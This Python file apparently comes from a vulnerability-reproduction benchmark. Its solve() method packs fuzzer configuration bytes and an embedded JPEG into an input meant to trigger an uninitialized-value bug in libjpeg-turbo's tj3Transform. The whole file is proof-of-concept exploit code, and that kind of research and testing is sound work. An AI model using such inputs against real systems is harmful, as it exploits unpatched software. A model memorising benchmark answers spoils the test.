import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        
        # This PoC is designed for the tj3_transform_fuzzer harness.
        # It consists of a configuration prefix followed by JPEG data.
        # The configuration sets up a crop transformation that triggers the
        # uninitialized value bug in tj3Transform.
        
        # Configuration for FuzzedDataProvider:
        # We need to provide bytes that will be deterministically parsed into
        # the desired transformation parameters.
        # Target parameters:
        # n = 1 (number of transforms)
        # transform[0].op = 5 (TJXOP_ROT90)
        # transform[0].options = 6 (TJXOPT_TRIM | TJXOPT_CROP)
        # transform[0].r = {x: 0, y: 0, w: 24, h: 24}

        config = b''
        
        # n = 1: The fuzzer calculates 1 + (val % 100). To get 1, val % 100 must be 0.
        config += struct.pack('<I', 0)
        
        # op = 5: The fuzzer calculates 0 + (val % 9). To get 5, val % 9 must be 5.
        config += struct.pack('<I', 5)
        
        # options = 6: The fuzzer consumes the integer directly.
        config += struct.pack('<I', 6)
        
        # r.x = 0: The fuzzer calculates 0 + (val % 1025). To get 0, val % 1025 must be 0.
        config += struct.pack('<I', 0)
        
        # r.y = 0: Same as r.x.
        config += struct.pack('<I', 0)
        
        # r.w = 24: The fuzzer calculates 0 + (val % 1025). To get 24, val % 1025 must be 24.
        config += struct.pack('<I', 24)
        
        # r.h = 24: Same as r.w.
        config += struct.pack('<I', 24)

        # A pre-generated 32x32 grayscale JPEG image.
        # The vulnerability is triggered when transforming this image.
        jpeg_data = bytes.fromhex(
            "ffd8ffe000104a46494600010100000100010000ffdb00430001010101010101"
            "0101010101010101010101010101010101010101010101010101010101010101"
            "01010101010101010101010101010101010101010101ffc0000b080020002001"
            "011100ffc4001f00000105010101010101000000000000000001020304050607"
            "08090a0bffc400b5100002010303020403050504040000017d01020300041105"
            "122131410613516107227114328191a1082342b1c11552d1f02433627282090a"
            "161718191a25262728292a3435363738393a434445464748494a535455565758"
            "595a636465666768696a737475767778797a838485868788898a929394959697"
            "98999aa2a3a4a5a6a7a8a9aab2b3b4b5b6b7b8b9bac2c3c4c5c6c7c8c9cad2d3"
            "d4d5d6d7d8d9dae1e2e3e4e5e6e7e8e9eaf1f2f3f4f5f6f7f8f9faffda000801"
            "0100003f00f8a3ffffd9"
        )
        
        return config + jpeg_data